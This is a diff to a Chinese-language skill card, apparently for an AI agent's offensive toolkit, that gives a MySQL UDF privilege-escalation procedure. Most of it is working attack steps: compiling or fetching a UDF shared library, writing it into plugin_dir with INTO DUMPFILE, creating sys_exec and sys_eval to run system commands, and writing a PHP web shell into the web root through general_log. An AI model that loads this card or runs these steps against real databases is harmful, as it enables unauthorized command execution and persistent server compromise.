@@ -4,7 +4,7 @@ description: 'MySQL root → UDF shared library → SYSTEM命令执行。Linux�
 disable-model-invocation: true
 metadata: { domain: db, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：用 skill 工具按名加载本卡。
 
 ## MySQL UDF (User Defined Function) 提权
 
@@ -20,7 +20,7 @@ mysql -u root -p -e "SHOW VARIABLES LIKE 'secure_file_priv';"
 mysql -u root -p -e "SHOW VARIABLES LIKE 'plugin_dir';"
 # 版本 → 选择对应架构的 .so
 mysql -u root -p -e "SELECT @@version_compile_os, @@version_compile_machine;"
-```
+```text
 
 ### UDF 库准备
 ```bash
@@ -32,13 +32,13 @@ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 cp /usr/share/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so .
 # 或者
 searchsploit -m 1518   # raptor_udf2.c
-```
+```text
 
 ### 利用
 ```sql
--- 1. 写 so 到 plugin 目录
-SELECT hex(LOAD_FILE('/tmp/raptor_udf2.so')) INTO DUMPFILE '/tmp/raptor.hex';
--- 或者通过 INSERT + SELECT INTO DUMPFILE 写二进制
+-- 1. 写 so 到 plugin 目录（二进制写入）
+--    本机先 xxd -p raptor_udf2.so | tr -d '\n' 取 hex，再写入：
+SELECT 0x<HEX_OF_SO> INTO DUMPFILE '<plugin_dir>/raptor_udf2.so';
 
 -- 2. 创建函数
 CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'raptor_udf2.so';
@@ -52,20 +52,19 @@ SELECT sys_eval('id');
 -- 4. （可选）清理
 DROP FUNCTION sys_exec;
 DROP FUNCTION sys_eval;
-```
+```text
 
 ### 如果 secure_file_priv 非空
 ```sql
 -- 写文件到允许的路径
 SELECT @@secure_file_priv;   -- 如 /var/lib/mysql-files/
--- 改 plugin_dir
-SET GLOBAL plugin_dir = '/var/lib/mysql-files/';
+-- 注意：plugin_dir 是只读变量，无法 SET GLOBAL 修改；.so 必须写进 plugin_dir 实际路径
 -- 或者用 general_log 写文件（需要 FILE 权限）
 SET GLOBAL general_log_file = '/var/www/html/shell.php';
 SET GLOBAL general_log = ON;
 SELECT '<?php system($_GET["c"]);?>';
 SET GLOBAL general_log = OFF;
-```
+```text
 
 ### 版本注意事项
 - MySQL < 5.0.67: 直接 SYSTEM 权限
